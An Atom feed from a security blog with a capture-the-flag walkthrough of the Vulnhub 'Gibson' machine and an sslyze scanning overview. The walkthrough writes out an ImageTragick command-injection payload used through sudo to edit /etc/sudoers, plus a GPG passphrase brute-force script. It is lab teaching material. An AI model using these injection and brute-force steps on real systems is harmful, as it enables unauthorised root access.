<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-11-11T17:41:52-05:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Gibson 0.2 walkthrough]]></title>
    <link href="http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough/"/>
    <updated>2017-10-28T16:10:23-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough</id>
    <content type="html"><![CDATA[<p>The Vulnhub machine I picked for today&rsquo;s target is called Gibson. For this challenge, there are also some hints:</p>

<ul>
<li>SSH can forward X11.</li>
<li>The challenge isn&rsquo;t over with root. The flag is not where you expect to find it.</li>
</ul>


<p>Let&rsquo;s see what Gibson has in store for us!</p>

<!-- more -->


<h2>Recon</h2>

<p><code>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 fb:f6:d1:57:64:fa:38:66:2d:66:40:12:a4:2f:75:b4 (DSA)
|   2048 32:13:58:ae:32:b0:5d:b9:2a:9c:87:9c:ae:79:3b:2e (RSA)
|_  256 3f:dc:7d:94:2f:86:f1:83:41:db:8c:74:52:f0:49:43 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 273   2016-05-07 13:03  davinci.html
|_
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Index of /
</code></p>

<p>Looks like we only have SSH and a web server running on this box. The Gibson Mining Corporation page contains a  davinci.html file with a bolded message: <code>The answer you seek will be found by brute force</code>. And the page source also has an interesting comment:</p>

<p>```</p>

<!-- Damn it Margo! Stop setting your password to "god" -->


<!-- at least try and use a different one of the 4 most -->


<!-- common ones! (eugene) -->


<p>```</p>

<p>With this information in hand, I tried SSH'ing as Margo with password god. That didn&rsquo;t work, but doing it as margo instead got me in. We have a shell on the box already!</p>

<h2>Privilege escalation</h2>

<p>We&rsquo;re in as margo, but we need root. I ran my <a href="https://github.com/chousensha/linux_privcheck">linux_pricheck script</a> and sifted through the output to see what might be helpful. Some of the discoveries:</p>

<ul>
<li>there is a network interface connected to a different subnet:</li>
</ul>


<p>```
virbr0    Link encap:Ethernet  HWaddr fe:54:00:72:e2:fb</p>

<pre><code>      inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
      RX packets:7 errors:0 dropped:0 overruns:0 frame:0
      TX packets:17 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:0 
      RX bytes:1347 (1.3 KB)  TX bytes:2459 (2.4 KB)
</code></pre>

<p>```</p>

<ul>
<li>VNC is running on the localhost:</li>
</ul>


<p><code>
tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      -               
</code></p>

<ul>
<li>user marvo has some sudo privileges that need to be checked out:</li>
</ul>


<p>```
User margo may run the following commands on gibson:</p>

<pre><code>(ALL) NOPASSWD: /usr/bin/convert
</code></pre>

<p>```</p>

<ul>
<li>other users on the host are duke and eugene</li>
</ul>


<p>Alright, we have a solid start. First thing I did was check that convert binary:</p>

<p>```
margo@gibson:~$ /usr/bin/convert
Version: ImageMagick 6.7.7-10 2014-03-06 Q16 <a href="http://www.imagemagick.org">http://www.imagemagick.org</a>
Copyright: Copyright &copy; 1999-2012 ImageMagick Studio LLC
Features: OpenMP</p>

<p>Usage: convert [options &hellip;] file [ [options &hellip;] file &hellip;] [options &hellip;] file
[&hellip;]
```</p>

<p>ImageMagick? More like <a href="https://www.exploit-db.com/exploits/39767/">ImageTragick</a>. This particular version of the ImageMagick library is vulnerable to command execution due to insufficient filtering in shell characters.</p>

<blockquote><p>Insufficient filtering for filename passed to delegate&rsquo;s command allows
remote code execution during conversion of several file formats.</p>

<p>ImageMagick allows to process files with external libraries. This
feature is called &lsquo;delegate&rsquo;. It is implemented as a system() with command string (&lsquo;command&rsquo;)</p>

<p>One of the default delegate&rsquo;s command is used to handle https requests:</p>

<p>&ldquo;wget&rdquo; -q -O &ldquo;%o&rdquo; &ldquo;<a href="https:%M">https:%M</a>&rdquo;</p>

<p>Due to insufficient %M param filtering it is possible to conduct shell command injection, where %M is the actual
link from the input. It is possible to pass the value like <code>https://example.com"|ls "-la</code> and
execute unexpected &lsquo;ls -la&rsquo;. (wget or curl should be installed)</p></blockquote>

<p>So, the injection would look like this:</p>

<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"&rsquo; tragic.png</code></p>

<p>And if the command takes arguments:</p>

<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"-flags&rsquo; tragic.png</code></p>

<p>Of course, you are not limited to the pipe character. You can also use <strong>;</strong>.</p>

<p>Since the convert binary runs with sudo privileges, it is possible to escalate privileges by editing <strong>/etc/sudoers</strong>:</p>

<p><code>
margo@gibson:~$ sudo /usr/bin/convert 'https://dummyurl";vim /etc/sudoers"' tragic.png
</code></p>

<p>The sudoers file will pop up in vim, and I gave full access to margo:</p>

<p>```</p>

<h1>User privilege specification</h1>

<p>root    ALL=(ALL:ALL) ALL</p>

<p>margo    ALL=(ALL:ALL) ALL
```</p>

<p>Also, some other interesting tidbits in the the sudoers file:</p>

<p>```</p>

<h1>Allow members of group sudo to execute any command</h1>

<h2>disabled after Margo&rsquo;s security incident</h2>

<h2>%sudo ALL=(ALL:ALL) ALL</h2>

<h1>Allow Margo to convert pictures from the FTP server</h1>

<p>margo ALL=(ALL) NOPASSWD: /usr/bin/convert</p>

<h1>Allow eugene to manage virtual machines and visudo</h1>

<p>eugene ALL=(ALL) NOPASSWD: /usr/bin/virt-manager
eugene ALL=(ALL:ALL)  /usr/sbin/visudo
```</p>

<p>I quit vim with <code>:wq!</code> to override the warning I got. The convert binary throws some errors, but the code was executed!</p>

<p><code>
convert: unable to open image `/tmp/magick-AJXBjcDc': No such file or directory @ error/blob.c/OpenBlob/2638.
convert: unable to open file `/tmp/magick-AJXBjcDc': No such file or directory @ error/constitute.c/ReadImage/583.
convert: no images defined `tragic.png' @ error/convert.c/ConvertImageCommand/3044.
margo@gibson:~$ sudo su
[sudo] password for margo:
root@gibson:/home/margo#
</code></p>

<p>From the system recon we performed, we know there is a VM running on the host. I re-ran my SSH connection with the <strong>-X</strong> flag to enable X11 forwarding, because I wanted to use virt-manager to take a look at the VM. However, I got an error: <code>X11 connection rejected because of wrong authentication</code>. Not a problem, we have virsh!</p>

<p>```
root@gibson:~# virsh list &mdash;all</p>

<h2> Id    Name                           State</h2>

<p> 2     ftpserv                        running
```</p>

<p>At this point, I wanted to make things easier for me, so I decided to get the VM to my own system and continue from there. I located the VM:</p>

<p><code>
ls /var/lib/libvirt/images/
ftpserv.img
</code></p>

<p>To transfer the VM using scp, I first needed to enable SSH'ing as root. I edited <code>/etc/ssh/sshd_config</code> to have the following:</p>

<p>```
PermitRootLogin yes
AllowUsers eugene margo root
Match user root</p>

<pre><code>PasswordAuthentication yes
</code></pre>

<p>```</p>

<p>Then I changed root&rsquo;s password, and reloaded the SSH config file with <code>service ssh reload</code>. Now I was able to transfer the image:</p>

<p><code>
scp root@192.168.217.148:/var/lib/libvirt/images/ftpserv.img /mnt/ftpserv.img
Ubuntu 14.04.3 LTS
root@192.168.217.148's password:
ftpserv.img                                   100%  512MB  22.6MB/s   00:22    
</code></p>

<p>Let&rsquo;s see what we have here:</p>

<p><code>
file ftpserv.img
ftpserv.img: DOS/MBR boot sector, FREE-DOS Beta 0.9 MBR; partition 1 : ID=0xe, active, start-CHS (0x0,1,1), end-CHS (0xf,15,63), startsector 63, 1048257 sectors
</code></p>

<p>To mount it, we need to learn the offset:</p>

<p>```
fdisk -l ftpserv.img
Disk ftpserv.img: 512 MiB, 536870912 bytes, 1048576 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x00000000</p>

<p>Device       Boot Start     End Sectors   Size Id Type
ftpserv.img1 *       63 1048319 1048257 511.9M  e W95 FAT16 (LBA)
```</p>

<p>So the start block is 63 and the block size is 512..then the offset is 63 * 512, or 32256. Time to mount the image:</p>

<p><code>
root@kali:/mnt# mkdir ftpserv
mount -o loop,offset=32256 ftpserv.img ftpserv
</code></p>

<p>Mounting is done via the loop device, which is a file that acts as a block-based device. Now, a new device called KFLYNN appeared on my system. Kevin Flynn, maybe? Anyway, let&rsquo;s look inside:</p>

<p><code>
ls ftpserv
AUTOEXEC.BAT  COMMAND.COM  FDCONFIG.SYS  KERNEL.SYS
BOOTSECT.BIN  DOS          GARBAGE       net
</code></p>

<p>The GARBAGE directory seems interesting:</p>

<p><code>
ls GARBAGE/
adminspo.jpg  flag.img  jz_ug.ans
</code></p>

<p>Let&rsquo;s see the picture first:</p>

<p><img class="center" src="/images/pentest/gibson/adminspo.jpg" title="&lsquo;sysadmin&rsquo; &lsquo;sysadmin life&rsquo;" ></p>

<p>I also ran exiftool on it and was rewarded with..something:</p>

<p><code>
exiftool adminspo.jpg
ExifTool Version Number         : 10.60
File Name                       : adminspo.jpg
Directory                       : .
File Size                       : 120 kB
File Modification Date/Time     : 2016:05:04 17:17:44-04:00
File Access Date/Time           : 2017:10:01 15:14:34-04:00
File Inode Change Date/Time     : 2016:05:04 17:31:08-04:00
File Permissions                : rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : Rabbit.. Flu Shot... TYPE COOKE YOU IDIOT! I'll head them off at the pass
Modify Date                     : 2016:05:04 22:29:32
Artist                          : Virtualization is fun.. What's more, esoteric OSes on 192.168.122 are even more fun
User Comment                    : So there's info here.... Images, hmm... Wasn't that a CVE...? Oh yes... CVE 2016-3714....http://www.openwall.com/lists/oss-security/2016/05/03/18 so which person can run it. Perhaps the man who knew a lot about Sean Connery in Trainspotting when he wasn't  causing a 7 point drop in the NYSE
[...]
</code></p>

<p>Next I looked at the ANS file:</p>

<p><code>
file jz_ug.ans
jz_ug.ans: ISO-8859 text, with CRLF line terminators, with escape sequences
</code></p>

<p>Apparently, this type of file is a text document graphic based on the ANSI text standard; may also be used to store text graphics, which uses characters to display images in a text document. I read it like a text file:</p>

<p>```
cat jz_ug.ans</p>

<p>   �������ݲܱ����ܲ����۲ܱ�������������ܲ�ܲ������������ܲ�ܱ��ܲ�ܱ����</p>

<pre><code>�����������������������������������������������������۲���������������
�������������������������۲���������� ��������۲�����۲���������������
���������������������������������������������������� �����������������
޲���������۲�����۲�����������    �����۲���    ����������߲������۲�
 ��߱� ����������߲����������߲    �����߲���    ����߲���߲��ݲ����߲jz
                              �                            �         �
                the ugliest of all are under 5 feet tall
</code></pre>

<p>```</p>

<p>Hmm, ok. Finally, another image file:</p>

<p><code>
file flag.img
flag.img: Linux rev 1.0 ext2 filesystem data, UUID=d59bdd40-ec37-4d24-a956-80f549846121
</code></p>

<p>This time it&rsquo;s an EXT2 filesystem. I mounted it:</p>

<p><code>
mount ftpserv/GARBAGE/flag.img flag
ls -la
total 70
drwxr-xr-x 4 root root  1024 May 14  2016 .
drwxr-xr-x 5 root root  4096 Oct 28 13:05 ..
-rwxrwxr-x 1 root root 21358 Nov 15  2011 davinci
-rw-r--r-- 1 root root 28030 Nov 15  2011 davinci.c
-rw-r--r-- 1 root root   159 May  5  2016 hint.txt
drwx------ 2 root root 12288 May  5  2016 lost+found
drwxr-xr-x 2 root root  1024 May  5  2016 .trash
</code></p>

<p>Davinci is a snake game:</p>

<p>```</p>

<pre><code>        _________         _________             
       /         \       /         \            
      /  /~~~~~\  \     /  /~~~~~\  \           
      |  |     |  |     |  |     |  |           
      |  |     |  |     |  |     |  |           
      |  |     |  |     |  |     |  |         / 
      |  |     |  |     |  |     |  |       //  
     (o  o)    \  \_____/  /     \  \_____/ /   
      \__/      \         /       \        /    
        |        ~~~~~~~~~         ~~~~~~~~         
        ^                               
        Welcome To The Snake Game!          
                Press Any Key To Continue...    
</code></pre>

<p>```</p>

<p>Its source code hints that it&rsquo;s vulnerable to buffer overflow if more than 128 characters are entered. Let&rsquo;s look at the hint now:</p>

<p><code>
cat hint.txt
http://www.imdb.com/title/tt0117951/ and
http://www.imdb.com/title/tt0113243/ have
someone in common... Can you remember his
original nom de plume in 1988...?
</code></p>

<p>The IMDB references are for the movies Trainspotting and Hackers. And who do they have in common? Jonny Lee Miller. You can find the name referenced in the hint by reading the description for the Hackers movie. It&rsquo;s a handle: Zero Cool.</p>

<p>And finally, the hidden directory:</p>

<p><code>
ls -l
total 317
---x------ 1 root root    469 May 14  2016 flag.txt.gpg
-rw-r--r-- 1 root root 320130 Sep  7  2015 LeithCentralStation.jpg
</code></p>

<p>The image is an ad for Trainspotting and has nothing out of the ordinary in the exiftool output. And, of course, the best for last! It seems we have a flag, but it&rsquo;s encrypted. I tried some ZeroCool variations, but it seems more calculation power will need to be thrown at this. I made a file with the handle to be transformed in many possible passwords by John:</p>

<p><code>
cat tries.txt
zero cool
zerocool
zero kool
zerokool
</code></p>

<p>Next I used John to generate a file of uppercase and lowercase combinations from this initial file:</p>

<p><code>
john --rules=nt --wordlist=tries.txt --stdout &gt; pass.txt
Created directory: /root/.john
Press 'q' or Ctrl-C to abort, almost any other key for status
1504p 0:00:00:01 100.00% (2017-10-28 13:37) 1139p/s ZERO KOOL
</code></p>

<p>And after so many hacker references, also add l33t speak to the combinations, with Korelogic rules. First, download the rules file:</p>

<p><code>
wget http://openwall.info/wiki/_media/john/korelogic-rules-20100801.txt
</code></p>

<p>Now add the rules to John&rsquo;s config file:</p>

<p><code>
cat korelogic-rules-20100801.txt &gt;&gt; /etc/john/john.conf
</code></p>

<p>Now I was able to generate the file with p@$$w0rd$:</p>

<p><code>
john --rules=KoreLogicRulesL33t --wordlist=pass.txt --stdout &gt; coolpass.txt
Press 'q' or Ctrl-C to abort, almost any other key for status
132384p 0:00:00:00 100.00% (2017-10-28 13:54) 240698p/s Z3ro k0o1
</code></p>

<p>And a quick shell script for bruteforcing from the file:</p>

<p>```
for pass in $(cat coolpass.txt) ; do</p>

<pre><code>echo "Trying:" $pass
gpg --batch --status-fd --with-colons --output flag.txt --passphrase $pass --decrypt flag.txt.gpg
if [ -a "flag.txt" ]; then echo "Passphrase found! $pass"
break
fi
</code></pre>

<p>done
```</p>

<p>The correct passphrase is <strong>Z3r0K00l</strong></p>

<p><code>
Trying: Z3r0K00l
gpg: CAST5 encrypted data
[GNUPG:] NEED_PASSPHRASE_SYM 3 3 2
gpg: encrypted with 1 passphrase
[GNUPG:] BEGIN_DECRYPTION
[GNUPG:] DECRYPTION_INFO 0 3
[GNUPG:] PLAINTEXT 62 1463231918 flag.txt
[GNUPG:] PLAINTEXT_LENGTH 862
[GNUPG:] DECRYPTION_OKAY
gpg: WARNING: message was not integrity protected
[GNUPG:] END_DECRYPTION
Passphrase found! Z3r0K00l
</code></p>

<p>And the flag is:</p>

<p>```
cat flag.txt</p>

<hr />

<p>| | | | <strong> _  </strong><em>| | __ |</em>   <em>| |<strong>   </strong></em>   |  _ \| | <strong> _ _ </strong>   <strong><em>| |</em>| |
| |<em>| |/ </em><code>|/ __| |/ /   | | | '_ \ / _ \  | |_) | |/ _</code> | &lsquo;_ \ / _ \ </strong>| |
|  _  | (<em>| | (<strong>|   &lt;    | | | | | |  </strong>/  |  __/| | (</em>| | | | |  <strong>/ |<em>|</em>|
|<em>| |</em>|_<em>,</em>|_</strong>|<em>|_\   |</em>| |<em>| |</em>|_<strong>|  |<em>|   |</em>|_<em>,</em>|<em>| |</em>|_</strong>|_<em>(</em>)</p>

<p>Should you not be standing in a 360 degree rotating payphone when reading
this flag&hellip;? B-)</p>

<p>Anyhow, congratulations once more on rooting this VM. This time things were
a bit esoteric, but I hope you enjoyed it all the same.</p>

<p>Shout-outs again to #vulnhub for hosting a great learning tool. A special
thanks goes to g0blin and GKNSB for testing, and to g0tM1lk for the offer
to host the CTF once more.</p>

<pre><code>                                                          --Knightmare
</code></pre>

<p>```</p>

<p><strong>Learn more</strong></p>

<ul>
<li><a href="https://imagetragick.com/">ImageTragick</a></li>
</ul>


<p>```</p>

<hr />

<p>/ Q: Why is Christmas just like a day at \
| the office? A: You do all of the work  |
| and the fat guy in the suit            |
|                                        |
\ gets all the credit.                   /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sslyze - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/16/sslyze-kali-linux-tools/"/>
    <updated>2017-07-16T04:57:44-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/16/sslyze-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: test the SSL/TLS security posture of a target as a standalone tool or as a custom made solution. sslyze is a fast and powerful SSL/TLS scanning Python tool that can be used both from the command line or as a library to include in your own scripts. It&rsquo;s being updated frequently and it&rsquo;s been tested on Windows, Linux and MacOS platforms.</p>

<p>Homepage: <a href="https://github.com/nabla-c0d3/sslyze">https://github.com/nabla-c0d3/sslyze</a></p>

<!-- more -->


<h2>sslyze description</h2>

<blockquote><p>SSLyze is a Python library and a CLI tool that can analyze the SSL configuration of a server by connecting to it. It
is designed to be fast and comprehensive, and should help organizations and testers identify mis-configurations
affecting their SSL/TLS servers.</p>

<p>Key features include:</p>

<ul>
<li><p>Python API, in order to run scans and process the results directly from Python.</p></li>
<li><p>Scans are automatically dispatched among multiple processes, making them very fast.</p></li>
<li><p>Performance testing: session resumption and TLS tickets support.</p></li>
<li><p>Security testing: weak cipher suites, insecure renegotiation, CRIME, Heartbleed and more.</p></li>
<li><p>Server certificate validation and revocation checking through OCSP stapling.</p></li>
<li><p>Support for StartTLS handshakes on SMTP, XMPP, LDAP, POP, IMAP, RDP, PostGres and FTP.</p></li>
<li><p>Support for client certificates when scanning servers that perform mutual authentication.</p></li>
<li><p>Scan results can be written to an XML or JSON file for further processing.</p></li>
<li><p>And much more!</p></li>
</ul>


<p>SSLyze is all Python code but it uses an OpenSSL wrapper written in C called nassl, which was specifically developed
for allowing SSLyze to access the low-level OpenSSL APIs needed to perform deep SSL testing.</p></blockquote>

<p>Documentation: <a href="https://nabla-c0d3.github.io/sslyze/documentation/">https://nabla-c0d3.github.io/sslyze/documentation/</a></p>

<h2>sslyze options</h2>

<p>```
Usage: sslyze.py [options] target1.com target2.com:443 etc&hellip;</p>

<p>Options:
  &mdash;version             show program&rsquo;s version number and exit
  -h, &mdash;help            show this help message and exit
  &mdash;xml_out=XML_FILE    Writes the scan results as an XML document to the file</p>

<pre><code>                    XML_FILE. If XML_FILE is set to "-", the XML output
                    will instead be printed to stdout.
</code></pre>

<p>  &mdash;targets_in=TARGETS_IN</p>

<pre><code>                    Reads the list of targets to scan from the file
                    TARGETS_IN. It should contain one host:port per line.
</code></pre>

<p>  &mdash;timeout=TIMEOUT     Sets the timeout value in seconds used for every</p>

<pre><code>                    socket connection made to the target server(s).
                    Default is 5s.
</code></pre>

<p>  &mdash;nb_retries=NB_RETRIES</p>

<pre><code>                    Sets the number retry attempts for all network
                    connections initiated throughout the scan. Increase
                    this value if you are getting a lot of
                    timeout/connection errors when scanning a specific
                    server. Decrease this value to increase the speed of
                    the scans; results may however return connection
                    errors. Default is 4 connection attempts.
</code></pre>

<p>  &mdash;https_tunnel=HTTPS_TUNNEL</p>

<pre><code>                    Tunnels all traffic to the target server(s) through an
                    HTTP CONNECT proxy. HTTP_TUNNEL should be the proxy's
                    URL: 'http://USER:PW@HOST:PORT/'. For proxies
                    requiring authentication, only Basic Authentication is
                    supported.
</code></pre>

<p>  &mdash;starttls=STARTTLS   Performs StartTLS handshakes when connecting to the</p>

<pre><code>                    target server(s). STARTTLS should be one of: ['smtp',
                    'xmpp', 'xmpp_server', 'pop3', 'ftp', 'imap', 'ldap',
                    'rdp', 'postgres', 'auto']. The 'auto' option will
                    cause SSLyze to deduce the protocol (ftp, imap, etc.)
                    from the supplied port number, for each target
                    servers.
</code></pre>

<p>  &mdash;xmpp_to=XMPP_TO     Optional setting for STARTTLS XMPP.  XMPP_TO should be</p>

<pre><code>                    the hostname to be put in the 'to' attribute of the
                    XMPP stream. Default is the server's hostname.
</code></pre>

<p>  &mdash;sni=SNI             Use Server Name Indication to specify the hostname to</p>

<pre><code>                    connect to. Will only affect TLS 1.0+ connections.
</code></pre>

<p>  &mdash;quiet               Hide script standard outputs. Will only affect script</p>

<pre><code>                    output if --xml_out is set.
</code></pre>

<p>  &mdash;regular             Regular HTTPS scan; shortcut for &mdash;sslv2 &mdash;sslv3</p>

<pre><code>                    --tlsv1 --tlsv1_1 --tlsv1_2 --reneg --resum
                    --certinfo=basic --http_get --hide_rejected_ciphers
                    --compression --heartbleed
</code></pre>

<p>  Client certificate support:</p>

<pre><code>--cert=CERT         Client certificate chain filename. The certificates
                    must be in PEM format and must be sorted starting with
                    the subject's client certificate, followed by
                    intermediate CA certificates if applicable.
--key=KEY           Client private key filename.
--keyform=KEYFORM   Client private key format. DER or PEM (default).
--pass=KEYPASS      Client private key passphrase.
</code></pre>

<p>  PluginOpenSSLCipherSuites:</p>

<pre><code>Scans the server(s) for supported OpenSSL cipher suites.

--sslv2             Lists the SSL 2.0 OpenSSL cipher suites supported by
                    the server(s).
--sslv3             Lists the SSL 3.0 OpenSSL cipher suites supported by
                    the server(s).
--tlsv1             Lists the TLS 1.0 OpenSSL cipher suites supported by
                    the server(s).
--tlsv1_1           Lists the TLS 1.1 OpenSSL cipher suites supported by
                    the server(s).
--tlsv1_2           Lists the TLS 1.2 OpenSSL cipher suites supported by
                    the server(s).
--http_get          Option - For each cipher suite, sends an HTTP GET
                    request after completing the SSL handshake and returns
                    the HTTP status code.
--hide_rejected_ciphers
                    Option - Hides the (usually long) list of cipher
                    suites that were rejected by the server(s).
</code></pre>

<p>  PluginChromeSha1Deprecation:</p>

<pre><code>--chrome_sha1       Determines if the server will be affected by Google
                    Chrome's SHA-1 deprecation plans. See
                    http://googleonlinesecurity.blogspot.com/2014/09
                    /gradually-sunsetting-sha-1.html for more information
</code></pre>

<p>  PluginSessionRenegotiation:</p>

<pre><code>--reneg             Tests the server(s) for client-initiated renegotiation
                    and secure renegotiation support.
</code></pre>

<p>  PluginHeartbleed:</p>

<pre><code>--heartbleed        Tests the server(s) for the OpenSSL Heartbleed
                    vulnerability (experimental).
</code></pre>

<p>  PluginCertInfo:</p>

<pre><code>--certinfo=CERTINFO
                    Verifies the validity of the server(s) certificate(s)
                    against various trust stores, checks for support for
                    OCSP stapling, and prints relevant fields of the
                    certificate. CERTINFO should be 'basic' or 'full'.
--ca_file=CA_FILE   Local Certificate Authority file (in PEM format), to
                    verify the validity of the server(s) certificate(s)
                    against.
</code></pre>

<p>  PluginCompression:</p>

<pre><code>--compression       Tests the server(s) for Zlib compression support.
</code></pre>

<p>  PluginHSTS:</p>

<pre><code>--hsts              Checks support for HTTP Strict Transport Security
                    (HSTS) by collecting any Strict-Transport-Security
                    field present in the HTTP response sent back by the
                    server(s).
</code></pre>

<p>  PluginSessionResumption:</p>

<pre><code>Analyzes the target server's SSL session resumption capabilities.

--resum             Tests the server(s) for session resumption support
                    using session IDs and TLS session tickets (RFC 5077).
--resum_rate        Performs 100 session resumptions with the server(s),
                    in order to estimate the session resumption rate.
</code></pre>

<p>```</p>

<h2>sslyze usage</h2>

<p>```
sslyze &mdash;regular bugcrowd.com</p>

<p> AVAILABLE PLUGINS</p>

<hr />

<p>  PluginSessionResumption
  PluginCompression
  PluginSessionRenegotiation
  PluginChromeSha1Deprecation
  PluginHSTS
  PluginHeartbleed
  PluginOpenSSLCipherSuites
  PluginCertInfo</p>

<p> CHECKING HOST(S) AVAILABILITY</p>

<hr />

<p>   bugcrowd.com:443                    => 104.20.4.239:443</p>

<p> SCAN RESULTS FOR BUGCROWD.COM:443 &ndash; 104.20.4.239:443</p>

<hr />

<ul>
<li><p>Deflate Compression:
  OK &ndash; Compression disabled</p></li>
<li><p>Session Renegotiation:
  Client-initiated Renegotiations:   OK &ndash; Rejected
  Secure Renegotiation:              OK &ndash; Supported</p></li>
<li><p>OpenSSL Heartbleed:
  OK &ndash; Not vulnerable to Heartbleed</p></li>
<li><p>Session Resumption:
  With Session IDs:                  OK &ndash; Supported (5 successful, 0 failed, 0 errors, 5 total attempts).
  With TLS Session Tickets:          OK &ndash; Supported</p></li>
<li><p>SSLV2 Cipher Suites:
  Server rejected all cipher suites.</p></li>
<li><p>Certificate &ndash; Content:
  SHA1 Fingerprint:                  db65dbb15a1819ad4692c47cfc0bc966beb6e44f
  Common Name:                       bugcrowd.com
  Issuer:                            DigiCert SHA2 Extended Validation Server CA
  Serial Number:                     075FE475034104F4909DDD4B5CD8C1AC
  Not Before:                        Oct 10 00:00:00 2015 GMT
  Not After:                         Oct 13 12:00:00 2017 GMT
  Signature Algorithm:               sha256WithRSAEncryption
  Public Key Algorithm:              rsaEncryption
  Key Size:                          2048 bit
  Exponent:                          65537 (0x10001)
  X509v3 Subject Alternative Name:   {&lsquo;DNS&rsquo;: [&lsquo;bugcrowd.com&rsquo;, &lsquo;forum.bugcrowd.com&rsquo;, &lsquo;blog.bugcrowd.com&rsquo;, &lsquo;docs.bugcrowd.com&rsquo;, &lsquo;tracker.bugcrowd.com&rsquo;]}</p></li>
<li><p>Certificate &ndash; Trust:
  Hostname Validation:               OK &ndash; Subject Alternative Name matches
  Google CA Store (09/2015):         OK &ndash; Certificate is trusted
  Java 6 CA Store (Update 65):       OK &ndash; Certificate is trusted
  Microsoft CA Store (09/2015):      OK &ndash; Certificate is trusted
  Mozilla NSS CA Store (09/2015):    OK &ndash; Certificate is trusted
  Apple CA Store (OS X 10.10.5):     OK &ndash; Certificate is trusted
  Certificate Chain Received:        [&lsquo;bugcrowd.com&rsquo;, &lsquo;DigiCert SHA2 Extended Validation Server CA&rsquo;]</p></li>
<li><p>Certificate &ndash; OCSP Stapling:
  OCSP Response Status:              successful
  Validation w/ Mozilla&rsquo;s CA Store:  OK &ndash; Response is trusted
  Responder Id:                      3DD350A5D6A0ADEEF34A600A65D321D4F8F8D60F
  Cert Status:                       good
  Cert Serial Number:                075FE475034104F4909DDD4B5CD8C1AC
  This Update:                       Jul 12 12:10:00 2017 GMT
  Next Update:                       Jul 19 11:25:00 2017 GMT</p></li>
<li><p>TLSV1_2 Cipher Suites:
  Preferred:                     <br/>
             ECDHE-RSA-AES128-GCM-SHA256   ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
  Accepted:                      <br/>
             ECDHE-RSA-AES256-SHA384       ECDH-256 bits  256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             ECDHE-RSA-AES256-SHA          ECDH-256 bits  256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             ECDHE-RSA-AES256-GCM-SHA384   ECDH-256 bits  256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES256-SHA256                 &ndash;              256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES256-SHA                    &ndash;              256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES256-GCM-SHA384             &ndash;              256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             ECDHE-RSA-AES128-SHA256       ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             ECDHE-RSA-AES128-GCM-SHA256   ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES128-SHA256                 &ndash;              128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES128-SHA                    &ndash;              128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES128-GCM-SHA256             &ndash;              128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a></p></li>
<li><p>TLSV1_1 Cipher Suites:
  Preferred:                     <br/>
             ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
  Accepted:                      <br/>
             ECDHE-RSA-AES256-SHA          ECDH-256 bits  256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
